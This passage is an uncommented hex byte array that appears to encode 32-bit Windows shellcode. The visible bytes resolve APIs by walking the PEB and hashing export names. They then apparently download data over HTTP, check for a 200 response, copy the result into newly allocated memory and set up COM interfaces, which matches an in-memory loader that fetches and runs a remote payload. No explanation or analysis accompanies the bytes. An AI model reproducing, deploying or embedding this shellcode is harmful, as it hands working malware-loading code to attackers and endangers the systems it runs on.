0x8d, 0x84, 0x24, 0xf4, 0x00, 0x00, 0x00, \n  0x89, 0x44, 0x24, 0x64, 0x8d, 0x44, 0x24, 0x74, 0x89, 0x44, 0x24, 0x54, \n  0x8d, 0x84, 0x24, 0xb4, 0x00, 0x00, 0x00, 0x6a, 0x40, 0x89, 0x44, 0x24, \n  0x60, 0x8d, 0x44, 0x24, 0x3c, 0x89, 0x4c, 0x24, 0x50, 0x89, 0x4c, 0x24, \n  0x6c, 0x59, 0x50, 0x68, 0x00, 0x00, 0x00, 0x10, 0x55, 0x8d, 0x86, 0x24, \n  0x09, 0x00, 0x00, 0x89, 0x4c, 0x24, 0x64, 0x50, 0x89, 0x4c, 0x24, 0x70, \n  0xff, 0x96, 0xbc, 0x00, 0x00, 0x00, 0x85, 0xc0, 0x0f, 0x84, 0x14, 0x03, \n  0x00, 0x00, 0x33, 0xc0, 0x83, 0x7c, 0x24, 0x44, 0x04, 0x0f, 0x94, 0xc0, \n  0x89, 0x44, 0x24, 0x18, 0xb8, 0x00, 0x33, 0xe0, 0x04, 0x0f, 0x44, 0xf8, \n  0x33, 0xc0, 0x50, 0x50, 0x50, 0x50, 0x50, 0x89, 0x7c, 0x24, 0x3c, 0xff, \n  0x96, 0xc0, 0x00, 0x00, 0x00, 0x89, 0x44, 0x24, 0x34, 0x85, 0xc0, 0x0f, \n  0x84, 0xe1, 0x02, 0x00, 0x00, 0x33, 0xc9, 0x51, 0x51, 0x6a, 0x03, 0x51, \n  0x51, 0xff, 0x74, 0x24, 0x64, 0x8d, 0x8c, 0x24, 0x10, 0x02, 0x00, 0x00, \n  0x51, 0x50, 0xff, 0x96, 0xc4, 0x00, 0x00, 0x00, 0x89, 0x44, 0x24, 0x30, \n  0x85, 0xc0, 0x0f, 0x84, 0x5a, 0x02, 0x00, 0x00, 0x33, 0xd2, 0x39, 0x5c, \n  0x24, 0x68, 0x75, 0x0a, 0x66, 0xc7, 0x84, 0x24, 0xf4, 0x00, 0x00, 0x00, \n  0x2f, 0x00, 0x52, 0x57, 0x52, 0x52, 0x52, 0x8d, 0x8c, 0x24, 0x08, 0x01, \n  0x00, 0x00, 0x51, 0x52, 0x50, 0xff, 0x96, 0xd8, 0x00, 0x00, 0x00, 0x8b, \n  0xf8, 0x85, 0xff, 0x0f, 0x84, 0x1f, 0x02, 0x00, 0x00, 0x39, 0x5c, 0x24, \n  0x18, 0x74, 0x22, 0xf7, 0x44, 0x24, 0x28, 0x00, 0x10, 0x00, 0x00, 0x74, \n  0x18, 0x6a, 0x04, 0x8d, 0x44, 0x24, 0x30, 0xc7, 0x44, 0x24, 0x30, 0x80, \n  0x33, 0x00, 0x00, 0x50, 0x6a, 0x1f, 0x57, 0xff, 0x96, 0xc8, 0x00, 0x00, \n  0x00, 0x39, 0x5c, 0x24, 0x58, 0x74, 0x13, 0xff, 0x74, 0x24, 0x58, 0xff, \n  0x74, 0x24, 0x58, 0x6a, 0x1c, 0x57, 0xff, 0x96, 0xc8, 0x00, 0x00, 0x00, \n  0x8b, 0xe8, 0x39, 0x5c, 0x24, 0x60, 0x74, 0x13, 0xff, 0x74, 0x24, 0x60, \n  0xff, 0x74, 0x24, 0x60, 0x6a, 0x1d, 0x57, 0xff, 0x96, 0xc8, 0x00, 0x00, \n  0x00, 0x8b, 0xe8, 0x33, 0xc0, 0x50, 0x50, 0x50, 0x50, 0x57, 0xff, 0x96, \n  0xdc, 0x00, 0x00, 0x00, 0x85, 0xc0, 0x0f, 0x84, 0xa9, 0x01, 0x00, 0x00, \n  0x6a, 0x00, 0x8d, 0x44, 0x24, 0x20, 0xc7, 0x44, 0x24, 0x20, 0x04, 0x00, \n  0x00, 0x00, 0x50, 0x8d, 0x44, 0x24, 0x28, 0x50, 0x68, 0x13, 0x00, 0x00, \n  0x20, 0x57, 0xff, 0x96, 0xe0, 0x00, 0x00, 0x00, 0x85, 0xc0, 0x0f, 0x84, \n  0x81, 0x01, 0x00, 0x00, 0x81, 0x7c, 0x24, 0x20, 0xc8, 0x00, 0x00, 0x00, \n  0x0f, 0x85, 0x73, 0x01, 0x00, 0x00, 0x21, 0x5c, 0x24, 0x10, 0x8d, 0x44, \n  0x24, 0x1c, 0x6a, 0x00, 0x50, 0x8d, 0x44, 0x24, 0x18, 0xc7, 0x44, 0x24, \n  0x24, 0x04, 0x00, 0x00, 0x00, 0x50, 0x68, 0x05, 0x00, 0x00, 0x20, 0x57, \n  0xff, 0x96, 0xe0, 0x00, 0x00, 0x00, 0x85, 0xc0, 0x0f, 0x85, 0xae, 0x00, \n  0x00, 0x00, 0xff, 0x96, 0x8c, 0x00, 0x00, 0x00, 0x3d, 0x76, 0x2f, 0x00, \n  0x00, 0x0f, 0x85, 0x36, 0x01, 0x00, 0x00, 0x33, 0xc0, 0x50, 0x50, 0x89, \n  0x44, 0x24, 0x18, 0x8d, 0x44, 0x24, 0x1c, 0x50, 0x57, 0xff, 0x96, 0xd4, \n  0x00, 0x00, 0x00, 0x85, 0xc0, 0x0f, 0x84, 0x1a, 0x01, 0x00, 0x00, 0x8b, \n  0x4c, 0x24, 0x14, 0x85, 0xc9, 0x74, 0x65, 0x8b, 0x96, 0x84, 0x00, 0x00, \n  0x00, 0x85, 0xdb, 0x75, 0x0b, 0x51, 0x6a, 0x01, 0xff, 0xd2, 0x50, 0xff, \n  0x56, 0x7c, 0xeb, 0x13, 0x8b, 0x44, 0x24, 0x10, 0x03, 0xc1, 0x50, 0x53, \n  0x6a, 0x01, 0xff, 0xd2, 0x50, 0xff, 0x96, 0x80, 0x00, 0x00, 0x00, 0x8b, \n  0xd8, 0x85, 0xdb, 0x0f, 0x84, 0xe0, 0x00, 0x00, 0x00, 0x8d, 0x44, 0x24, \n  0x24, 0x50, 0xff, 0x74, 0x24, 0x18, 0x8b, 0x44, 0x24, 0x18, 0x03, 0xc3, \n  0x50, 0x57, 0xff, 0x96, 0xcc, 0x00, 0x00, 0x00, 0x8b, 0x44, 0x24, 0x14, \n  0x01, 0x44, 0x24, 0x10, 0x8d, 0x44, 0x24, 0x14, 0x6a, 0x00, 0x6a, 0x00, \n  0x50, 0x57, 0xff, 0x96, 0xd4, 0x00, 0x00, 0x00, 0x85, 0xc0, 0x75, 0x93, \n  0x8d, 0x86, 0x84, 0x00, 0x00, 0x00, 0x89, 0x44, 0x24, 0x18, 0x85, 0xdb, \n  0x0f, 0x84, 0x9b, 0x00, 0x00, 0x00, 0xeb, 0x44, 0x39, 0x5c, 0x24, 0x10, \n  0x0f, 0x84, 0x8f, 0x00, 0x00, 0x00, 0xff, 0x74, 0x24, 0x10, 0x8d, 0x86, \n  0x84, 0x00, 0x00, 0x00, 0x6a, 0x01, 0xff, 0x10, 0x50, 0xff, 0x56, 0x7c, \n  0x8b, 0xd8, 0x85, 0xdb, 0x74, 0x77, 0x83, 0x64, 0x24, 0x24, 0x00, 0x8d, \n  0x44, 0x24, 0x24, 0x50, 0xff, 0x74, 0x24, 0x14, 0x53, 0x57, 0xff, 0x96, \n  0xcc, 0x00, 0x00, 0x00, 0x8b, 0xe8, 0x8d, 0x86, 0x84, 0x00, 0x00, 0x00, \n  0x89, 0x44, 0x24, 0x18, 0x83, 0x7c, 0x24, 0x10, 0x00, 0x74, 0x4e, 0x6a, \n  0x04, 0x68, 0x00, 0x30, 0x00, 0x00, 0xff, 0x74, 0x24, 0x18, 0x6a, 0x00, \n  0xff, 0x56, 0x3c, 0x89, 0x86, 0x60, 0x0d, 0x00, 0x00, 0x85, 0xc0, 0x74, \n  0x13, 0xff, 0x74, 0x24, 0x10, 0x53, 0x50, 0xe8, 0x17, 0x24, 0x00, 0x00, \n  0x33, 0xed, 0x83, 0xc4, 0x0c, 0x45, 0xeb, 0x02, 0x33, 0xed, 0xff, 0x74, \n  0x24, 0x10, 0x6a, 0x00, 0x53, 0xe8, 0x25, 0x24, 0x00, 0x00, 0x8b, 0x44, \n  0x24, 0x24, 0x83, 0xc4, 0x0c, 0x53, 0x6a, 0x01, 0xff, 0x10, 0x50, 0xff, \n  0x96, 0x88, 0x00, 0x00, 0x00, 0x57, 0xff, 0x96, 0xd0, 0x00, 0x00, 0x00, \n  0xff, 0x74, 0x24, 0x30, 0xff, 0x96, 0xd0, 0x00, 0x00, 0x00, 0xff, 0x74, \n  0x24, 0x34, 0xff, 0x96, 0xd0, 0x00, 0x00, 0x00, 0x85, 0xed, 0x74, 0x4e, \n  0x83, 0xbe, 0x34, 0x02, 0x00, 0x00, 0x03, 0x75, 0x45, 0xff, 0xb6, 0x58, \n  0x0d, 0x00, 0x00, 0x8b, 0xbe, 0x60, 0x0d, 0x00, 0x00, 0x8d, 0x86, 0x48, \n  0x0d, 0x00, 0x00, 0x57, 0x50, 0x8d, 0x86, 0x38, 0x0d, 0x00, 0x00, 0x50, \n  0xe8, 0x9e, 0x20, 0x00, 0x00, 0xff, 0x76, 0x2c, 0x8d, 0x86, 0x2c, 0x0c, \n  0x00, 0x00, 0xff, 0x76, 0x28, 0x50, 0xe8, 0x62, 0x1f, 0x00, 0x00, 0x83, \n  0xc4, 0x1c, 0x3b, 0x87, 0x18, 0x05, 0x00, 0x00, 0x75, 0x0c, 0x3b, 0x97, \n  0x1c, 0x05, 0x00, 0x00, 0x75, 0x04, 0x8b, 0xc5, 0xeb, 0x02, 0x33, 0xc0, \n  0x5f, 0x5e, 0x5d, 0x5b, 0x81, 0xc4, 0xec, 0x02, 0x00, 0x00, 0xc3, 0x81, \n  0xec, 0xdc, 0x01, 0x00, 0x00, 0x53, 0x55, 0x56, 0x8b, 0xb4, 0x24, 0xf0, \n  0x01, 0x00, 0x00, 0x57, 0x8b, 0x6e, 0x3c, 0x8b, 0x44, 0x2e, 0x78, 0x85, \n  0xc0, 0x0f, 0x84, 0xe5, 0x00, 0x00, 0x00, 0x8d, 0x3c, 0x30, 0x8b, 0x5f, \n  0x18, 0x85, 0xdb, 0x0f, 0x84, 0xd7, 0x00, 0x00, 0x00, 0x8b, 0x47, 0x1c, \n  0x33, 0xd2, 0x03, 0xc6, 0x89, 0x54, 0x24, 0x10, 0x89, 0x44, 0x24, 0x24, \n  0x8b, 0x47, 0x20, 0x03, 0xc6, 0x89, 0x44, 0x24, 0x14, 0x8b, 0x47, 0x24, \n  0x03, 0xc6, 0x89, 0x44, 0x24, 0x20, 0x8b, 0x47, 0x0c, 0x03, 0xc6, 0x8a, \n  0x08, 0x84, 0xc9, 0x74, 0x2a, 0x8b, 0x74, 0x24, 0x10, 0x8d, 0x94, 0x24, \n  0xe8, 0x00, 0x00, 0x00, 0x2b, 0xd0, 0x80, 0xc9, 0x20, 0x46, 0x88, 0x0c, \n  0x02, 0x40, 0x8a, 0x08, 0x84, 0xc9, 0x75, 0xf2, 0x89, 0x74, 0x24, 0x10, \n  0x8b, 0xb4, 0x24, 0xf4, 0x01, 0x00, 0x00, 0x8b, 0x54, 0x24, 0x10, 0xff, \n  0xb4, 0x24, 0x04, 0x02, 0x00, 0x00, 0x8d, 0x84, 0x24, 0xec, 0x00, 0x00, \n  0x00, 0xc6, 0x84, 0x14, 0xec, 0x00, 0x00, 0x00, 0x00, 0xff, 0xb4, 0x24, \n  0x04, 0x02, 0x00, 0x00, 0x50, 0xe8, 0x97, 0x1e, 0x00, 0x00, 0x89, 0x44, \n  0x24, 0x24, 0x83, 0xc4, 0x0c, 0x8b, 0x44, 0x24, 0x14, 0x83, 0xc0, 0xfc, \n  0x89, 0x54, 0x24, 0x1c, 0x8d, 0x04, 0x98, 0x89, 0x44, 0x24, 0x10, 0xff, \n  0xb4, 0x24, 0x04, 0x02, 0x00, 0x00, 0x8b, 0x08, 0xff, 0xb4, 0x24, 0x04, \n  0x02, 0x00, 0x00, 0x03, 0xce, 0x51, 0xe8, 0x66, 0x1e, 0x00, 0x00, 0x33, \n  0x44, 0x24, 0x24, 0x83, 0xc4, 0x0c, 0x33, 0x54, 0x24, 0x1c, 0x3b, 0x84, \n  0x24, 0xf8, 0x01, 0x00, 0x00, 0x75, 0x09, 0x3b, 0x94, 0x24, 0xfc, 0x01, \n  0x00, 0x00, 0x74, 0x1d, 0x8b, 0x44, 0x24, 0x10, 0x83, 0xe8, 0x04, 0x89, \n  0x44, 0x24, 0x10, 0x83, 0xeb, 0x01, 0x75, 0xbb, 0x33, 0xc0, 0x5f, 0x5e, \n  0x5d, 0x5b, 0x81, 0xc4, 0xdc, 0x01, 0x00, 0x00, 0xc3, 0x8b, 0x44, 0x24, \n  0x20, 0x8b, 0x4c, 0x24, 0x24, 0x0f, 0xb7, 0x44, 0x58, 0xfe, 0x8b, 0x14, \n  0x81, 0x03, 0xd6, 0x3b, 0xd7, 0x72, 0x76, 0x8b, 0x44, 0x2e, 0x7c, 0x03, \n  0xc7, 0x3b, 0xd0, 0x73, 0x6c, 0x33, 0xc9, 0x38, 0x0a, 0x74, 0x1d, 0x8d, \n  0x5c, 0x24, 0x28, 0x8b, 0xfa, 0x2b, 0xda, 0x83, 0xf9, 0x3c, 0x73, 0x10, \n  0x8a, 0x07, 0x88, 0x04, 0x3b, 0x3c, 0x2e, 0x74, 0x07, 0x41, 0x47, 0x80, \n  0x3f, 0x00, 0x75, 0xeb, 0x42, 0xc7, 0x44, 0x0c, 0x29, 0x64, 0x6c, 0x6c, \n  0x00, 0x03, 0xca, 0x33, 0xd2, 0x38, 0x11, 0x74, 0x17, 0x8d, 0x7c, 0x24, \n  0x68, 0x2b, 0xf9, 0x83, 0xfa, 0x7f, 0x73, 0x0c, 0x8a, 0x01, 0x42, 0x88, \n  0x04, 0x0f, 0x41, 0x80, 0x39, 0x00, 0x75, 0xef, 0x8d, 0x44, 0x24, 0x68, \n  0xc6, 0x44, 0x14, 0x68, 0x00, 0x50, 0x8d, 0x44, 0x24, 0x2c, 0x50, 0x56, \n  0xff, 0xb4, 0x24, 0xfc, 0x01, 0x00, 0x00, 0xe8, 0x0c, 0x00, 0x00, 0x00, \n  0x83, 0xc4, 0x10, 0x8b, 0xd0, 0x8b, 0xc2, 0xe9, 0x62, 0xff, 0xff, 0xff, \n  0x55, 0x8b, 0xec, 0x64, 0xa1, 0x18, 0x00, 0x00, 0x00, 0x33, 0xc9, 0x53, \n  0x56, 0x57, 0x8b, 0x40, 0x30, 0x8b, 0x7d, 0x08, 0x8b, 0x40, 0x0c, 0x8b, \n  0x70, 0x0c, 0x39, 0x4e, 0x18, 0x74, 0x2a, 0x8b, 0x5d, 0x0c, 0x85, 0xc9, \n  0x75, 0x3f, 0x39, 0x5e, 0x18, 0x74, 0x12, 0x51, 0xff, 0x75, 0x14, 0xff, \n  0x76, 0x18, 0x57, 0xe8, 0xc3, 0x1b, 0x00, 0x00, 0x83, 0xc4, 0x10, 0x8b, \n  0xc8, 0x8b, 0x36, 0x83, 0x7e, 0x18, 0x00, 0x75, 0xdd, 0x85, 0xc9, 0x75, \n  0x1c, 0xff, 0x75, 0x10, 0x57, 0xe8, 0x0b, 0x1b, 0x00, 0x00, 0x59, 0x59, \n  0x85, 0xc0, 0x74, 0x0b, 0xff, 0x75, 0x14, 0x50, 0xff, 0x57, 0x34, 0x8b, \n  0xc8, 0xeb, 0x02, 0x33, 0xc9, 0x5f, 0x5e, 0x8b, 0xc1, 0x5b, 0x5d, 0xc3, \n  0x56, 0x8b, 0x74, 0x24, 0x0c, 0x57, 0x33, 0xff, 0x8b, 0x4e, 0x18, 0x85, \n  0xc9, 0x74, 0x09, 0x8b, 0x01, 0x51, 0xff, 0x50, 0x08, 0x89, 0x7e, 0x18, \n  0x8b, 0x4e, 0x1c, 0x85, 0xc9, 0x74, 0x09, 0x8b, 0x01, 0x51, 0xff, 0x50, \n  0x08, 0x89, 0x7e, 0x1c, 0x8b, 0x4e, 0x14, 0x85, 0xc9, 0x74, 0x09, 0x8b, \n  0x01, 0x51, 0xff, 0x50, 0x08, 0x89, 0x7e, 0x14, 0x8b, 0x4e, 0x08, 0x85, \n  0xc9, 0x74, 0x1e, 0xff, 0x76, 0x10, 0x8b, 0x01, 0x51, 0xff, 0x50, 0x50, \n  0x8b, 0x46, 0x08, 0x50, 0x8b, 0x08, 0xff, 0x51, 0x2c, 0x8b, 0x46, 0x08, \n  0x50, 0x8b, 0x08, 0xff, 0x51, 0x08, 0x89, 0x7e, 0x08, 0x8b, 0x4e, 0x10, \n  0x85, 0xc9, 0x74, 0x09, 0x8b, 0x01, 0x51, 0xff, 0x50, 0x08, 0x89, 0x7e, \n  0x10, 0x8b, 0x4e, 0x0c, 0x85, 0xc9, 0x74, 0x09, 0x8b, 0x01, 0x51, 0xff, \n  0x50, 0x08, 0x89, 0x7e, 0x0c, 0x8b, 0x4e, 0x04, 0x85, 0xc9, 0x74, 0x09, \n  0x8b, 0x01, 0x51, 0xff, 0x50, 0x08, 0x89, 0x7e, 0x04, 0x8b, 0x0e, 0x85, \n  0xc9, 0x74, 0x08, 0x8b, 0x01, 0x51, 0xff, 0x50, 0x08, 0x89, 0x3e, 0x5f, \n  0x5e, 0xc3, 0x8b, 0x44, 0x24, 0x04, 0x83, 0xc0, 0x10, 0xf0, 0xff, 0x00, \n  0x8b, 0x00, 0xc2, 0x04, 0x00, 0xb8, 0x01, 0x40, 0x00, 0x80, 0xc2, 0x0c, \n  0x00, 0xb8, 0x01, 0x40, 0x00, 0x80, 0xc2, 0x10, 0x00, 0x8b, 0x44, 0x24, \n  0x04, 0xff, 0x74, 0x24, 0x18, 0xff, 0x74, 0x24, 0x14, 0x8b, 0x40, 0x08, \n  0xff, 0x74, 0x24, 0x14, 0x50, 0x8b, 0x08, 0xff, 0x51, 0x28, 0xc2, 0x18, \n  0x00, 0xb8, 0x01, 0x40, 0x00, 0x80, 0xc2, 0x14, 0x00, 0x57, 0x8b, 0x7c, \n  0x24, 0x14, 0x85, 0xff, 0x75, 0x07, 0xb8, 0x03, 0x40, 0x00, 0x80, 0xeb, \n  0x16, 0x56, 0x8b, 0x74, 0x24, 0x0c, 0x8b, 0x46, 0x08, 0x50, 0x8b, 0x08, \n  0xff, 0x51, 0x04, 0x8b, 0x46, 0x08, 0x89, 0x07, 0x33, 0xc0, 0x5e, 0x5f, \n  0xc2, 0x10, 0x00, 0x8b, 0x44, 0x24, 0x08, 0x85, 0xc0, 0x75, 0x07, 0xb8, \n  0x03, 0x40, 0x00, 0x80, 0xeb, 0x08, 0xc7, 0x00, 0x01, 0x00, 0x00, 0x00, \n  0x33, 0xc0, 0xc2, 0x08, 0x00, 0x55, 0x8b, 0xec, 0xff, 0x75, 0x28, 0x8b, \n  0x45, 0x08, 0xff, 0x75, 0x24, 0xff, 0x75, 0x20, 0x8b, 0x48, 0x08, 0xff, \n  0x75, 0x1c, 0xff, 0x75, 0x18, 0x8b, 0x11, 0xff, 0x75, 0x0c, 0x50, 0x51, \n  0xff, 0x52, 0x2c, 0x5d, 0xc2, 0x24, 0x00, 0x55, 0x8b, 0xec, 0x81, 0xec, \n  0x04, 0x02, 0x00, 0x00, 0x53, 0x56, 0x57, 0xe8, 0x8b, 0x19, 0x00, 0x00, \n  0x8b, 0x75, 0x0c, 0xb9, 0x7a, 0x1f, 0x40, 0x00, 0xbf, 0x7b, 0x36, 0x40, \n  0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, 0x0e, 0x89, 0x01, 0xe8, 0x71, 0x19, \n  0x00, 0x00, 0xb9, 0x32, 0x1c, 0x40, 0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, \n  0x0e, 0x89, 0x41, 0x04, 0xe8, 0x5e, 0x19, 0x00, 0x00, 0xb9, 0x03, 0x20, \n  0x40, 0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, 0x0e, 0x89, 0x41, 0x08, 0xe8, \n  0x4b, 0x19, 0x00, 0x00, 0xb9, 0x9f, 0x1c, 0x40, 0x00, 0x2b, 0xcf, 0x03, \n  0xc1, 0x8b, 0x0e, 0x89, 0x41, 0x0c, 0xe8, 0x38, 0x19, 0x00, 0x00, 0xb9, \n  0x75, 0x1c, 0x40, 0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, 0x0e, 0x89, 0x41, \n  0x10, 0xe8, 0x25, 0x19, 0x00, 0x00, 0xb9, 0x51, 0x1c, 0x40, 0x00, 0x2b, \n  0xcf, 0x03, 0xc1, 0x8b, 0x0e, 0x89, 0x41, 0x14, 0xe8, 0x12, 0x19, 0x00, \n  0x00, 0xb9, 0xb9, 0x1c, 0x40, 0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, 0x0e, \n  0x89, 0x41, 0x18, 0xe8, 0xff, 0x18, 0x00, 0x00, 0xb9, 0x1c, 0x12, 0x40, \n  0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, 0x0e, 0x89, 0x41, 0x1c, 0xe8, 0xec, \n  0x18, 0x00, 0x00, 0xb9, 0x2e, 0x11, 0x40, 0x00, 0x2b, 0xcf, 0x03, 0xc1, \n  0x8b, 0x0e, 0x89, 0x41, 0x20, 0xe8, 0xd9, 0x18, 0x00, 0x00, 0xb9, 0x2e, \n  0x11, 0x40, 0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, 0x0e, 0x89, 0x41, 0x24, \n  0xe8, 0xc6, 0x18, 0x00, 0x00, 0xb9, 0x2e, 0x11, 0x40, 0x00, 0x2b, 0xcf, \n  0x03, 0xc1, 0x8b, 0x0e, 0x89, 0x41, 0x28, 0xe8, 0xb3, 0x18, 0x00, 0x00, \n  0xb9, 0x2e, 0x11, 0x40, 0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, 0x0e, 0x89, \n  0x41, 0x2c, 0xe8, 0xa0, 0x18, 0x00, 0x00, 0xb9, 0x2e, 0x11, 0x40, 0x00, \n  0x2b, 0xcf, 0x03, 0xc1, 0x8b, 0x0e, 0x89, 0x41, 0x30, 0xe8, 0x8d, 0x18, \n  0x00, 0x00, 0xb9, 0xeb, 0x1f, 0x40, 0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, \n  0x0e, 0x89, 0x41, 0x34, 0xe8, 0x7a, 0x18, 0x00, 0x00, 0xb9, 0x2e, 0x11, \n  0x40, 0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, 0x0e, 0x89, 0x41, 0x38, 0xe8, \n  0x67, 0x18, 0x00, 0x00, 0xb9, 0x2e, 0x11, 0x40, 0x00, 0x2b, 0xcf, 0x03, \n  0xc1, 0x8b, 0x0e, 0x89, 0x41, 0x3c, 0xe8, 0x54, 0x18, 0x00, 0x00, 0xb9, \n  0x2e, 0x11, 0x40, 0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, 0x0e, 0x89, 0x41, \n  0x40, 0xe8, 0x41, 0x18, 0x00, 0x00, 0xb9, 0x2e, 0x11, 0x40, 0x00, 0x2b, \n  0xcf, 0x03, 0xc1, 0x8b, 0x0e, 0x89, 0x41, 0x44, 0xe8, 0x2e, 0x18, 0x00, \n  0x00, 0xb9, 0x2e, 0x11, 0x40, 0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, 0x0e, \n  0x89, 0x41, 0x48, 0xe8, 0x1b, 0x18, 0x00, 0x00, 0xb9, 0x2e, 0x11, 0x40, \n  0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, 0x0e, 0x89, 0x41, 0x4c, 0xe8, 0x08, \n  0x18, 0x00, 0x00, 0xb9, 0x2e, 0x11, 0x40, 0x00, 0x2b, 0xcf, 0x03, 0xc1, \n  0x8b, 0x0e, 0x89, 0x41, 0x50, 0xe8, 0xf5, 0x17, 0x00, 0x00, 0xb9, 0x49, \n  0x1c, 0x40, 0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, 0x0e, 0x89, 0x41, 0x54, \n  0xe8, 0xe2, 0x17, 0x00, 0x00, 0xb9, 0x2e, 0x11, 0x40, 0x00, 0x2b, 0xcf, \n  0x03, 0xc1, 0x8b, 0x0e, 0x89, 0x41, 0x58, 0xe8, 0xcf, 0x17, 0x00, 0x00, \n  0xb9, 0x6d, 0x1c, 0x40, 0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, 0x0e, 0x89, \n  0x41, 0x5c, 0xe8, 0xbc, 0x17, 0x00, 0x00, 0xb9, 0x2e, 0x11, 0x40, 0x00, \n  0x2b, 0xcf, 0x03, 0xc1, 0x8b, 0x0e, 0x89, 0x41, 0x60, 0xe8, 0xa9, 0x17, \n  0x00, 0x00, 0xb9, 0x13, 0x20, 0x40, 0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, \n  0x0e, 0x89, 0x41, 0x64, 0xe8, 0x96, 0x17, 0x00, 0x00, 0xb9, 0x41, 0x1c, \n  0x40, 0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, 0x0e, 0x89, 0x41, 0x68, 0xe8, \n  0x83, 0x17, 0x00, 0x00, 0xb9, 0x2e, 0x11, 0x40, 0x00, 0x2b, 0xcf, 0x03, \n  0xc1, 0x8b, 0x0e, 0x89, 0x41, 0x6c, 0xe8, 0x70, 0x17, 0x00, 0x00, 0xb9, \n  0x2e, 0x11, 0x40, 0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, 0x0e, 0x89, 0x41, \n  0x70, 0xe8, 0x5d, 0x17, 0x00, 0x00, 0xb9, 0x2e, 0x11, 0x40, 0x00, 0x2b, \n  0xcf, 0x8b, 0x7d, 0x08, 0x03, 0xc1, 0x8b, 0x0e, 0x89, 0x41, 0x74, 0x8d, \n  0x85, 0xfc, 0xfd, 0xff, 0xff, 0x83, 0x66, 0x10, 0x00, 0x50, 0x8d, 0x87, \n  0x19, 0x06, 0x00, 0x00, 0x89, 0x7e, 0x14, 0x50, 0x57, 0xe8, 0x16, 0x17, \n  0x00, 0x00, 0x83, 0xc4, 0x0c, 0x8d, 0x5e, 0x04, 0x8d, 0x85, 0xfc, 0xfd, \n  0xff, 0xff, 0x53, 0x50, 0xff, 0x97, 0xb8, 0x00, 0x00, 0x00, 0x85, 0xc0, \n  0x75, 0x13, 0x8b, 0x0b, 0x8d, 0x46, 0x08, 0x50, 0x8d, 0x87, 0xc0, 0x08, \n  0x00, 0x00, 0x50, 0x8b, 0x11, 0x51, 0xff, 0x52, 0x18, 0x5f, 0x5e, 0x5b, \n  0xc9, 0xc3, 0x8b, 0x54, 0x24, 0x0c, 0x85, 0xd2, 0x75, 0x07, 0xb8, 0x03, \n  0x40, 0x00, 0x80, 0xeb, 0x5f, 0x53, 0x8b, 0x5c, 0x24, 0x0c, 0x33, 0xc9, \n  0x56, 0x8b, 0x74, 0x24, 0x0c, 0x57, 0x8b, 0x7e, 0x14, 0x8b, 0x84, 0x8f, \n  0x30, 0x08, 0x00, 0x00, 0x3b, 0x04, 0x8b, 0x75, 0x08, 0x41, 0x83, 0xf9, \n  0x04, 0x75, 0xee, 0xeb, 0x2a, 0x33, 0xc9, 0x8b, 0x84, 0x8f, 0x40, 0x08, \n  0x00, 0x00, 0x3b, 0x04, 0x8b, 0x75, 0x08, 0x41, 0x83, 0xf9, 0x04, 0x75, \n  0xee, 0xeb, 0x14, 0x33, 0xc9, 0x8b, 0x84, 0x8f, 0xc0, 0x08, 0x00, 0x00, \n  0x3b, 0x04, 0x8b, 0x75, 0x0c, 0x41, 0x83, 0xf9, 0x04, 0x75, 0xee, 0x89, \n  0x32, 0x33, 0xc0, 0xeb, 0x08, 0x83, 0x22, 0x00, 0xb8, 0x02, 0x40, 0x00, \n  0x80, 0x5f, 0x5e, 0x5b, 0xc2, 0x0c, 0x00, 0x8b, 0x44, 0x24, 0x04, 0x6a, \n  0x00, 0x6a, 0x00, 0x6a, 0xfd, 0x8b, 0x40, 0x0c, 0x50, 0x8b, 0x08, 0xff, \n  0x51, 0x38, 0x33, 0xc0, 0xc2, 0x08, 0x00, 0x8b, 0x4c, 0x24, 0x04, 0x83, \n  0xc8, 0xff, 0xf0, 0x0f, 0xc1, 0x41, 0x10, 0x48, 0xc2, 0x04, 0x00, 0x8b, \n  0x44, 0x24, 0x04, 0xff, 0x74, 0x24, 0x08, 0x8b, 0x40, 0x14, 0xff, 0x50, \n  0x4c, 0x33, 0xc0, 0xc2, 0x08, 0x00, 0x55, 0x8b, 0xec, 0x81, 0xec, 0x80, \n  0x00, 0x00, 0x00, 0x56, 0x8b, 0x75, 0x08, 0x57, 0x81, 0xc6, 0x70, 0x04, \n  0x00, 0x00, 0x8a, 0x0e, 0x33, 0xc0, 0x84, 0xc9, 0x74, 0x3f, 0x8d, 0x7d, \n  0x80, 0x8b, 0xd6, 0x2b, 0xfe, 0x80, 0xf9, 0x3b, 0x74, 0x12, 0x3d, 0x80, \n  0x00, 0x00, 0x00, 0x7d, 0x0b, 0x88, 0x0c, 0x17, 0x40, 0x42, 0x8a, 0x0a, \n  0x84, 0xc9, 0x75, 0xe9, 0x85, 0xc0, 0x74, 0x1d, 0xff, 0x75, 0x0c, 0x46, \n  0xc6, 0x44, 0x05, 0x80, 0x00, 0x03, 0xf0, 0x8d, 0x45, 0x80, 0x50, 0xe8, \n  0xb4, 0x1c, 0x00, 0x00, 0x59, 0x59, 0x85, 0xc0, 0x75, 0xbc, 0x40, 0xeb, \n  0x02, 0x33, 0xc0, 0x5f, 0x5e, 0xc9, 0xc3, 0x55, 0x8b, 0xec, 0x83, 0xec, \n  0x1c, 0x83, 0x7d, 0x0c, 0x00, 0x74, 0x31, 0x6a, 0x1c, 0x8d, 0x45, 0xe4, \n  0x50, 0x8b, 0x45, 0x08, 0xff, 0x75, 0x0c, 0xff, 0x50, 0x44, 0x83, 0xf8, \n  0x1c, 0x75, 0x1d, 0x81, 0x7d, 0xf4, 0x00, 0x10, 0x00, 0x00, 0x75, 0x14, \n  0x81, 0x7d, 0xfc, 0x00, 0x00, 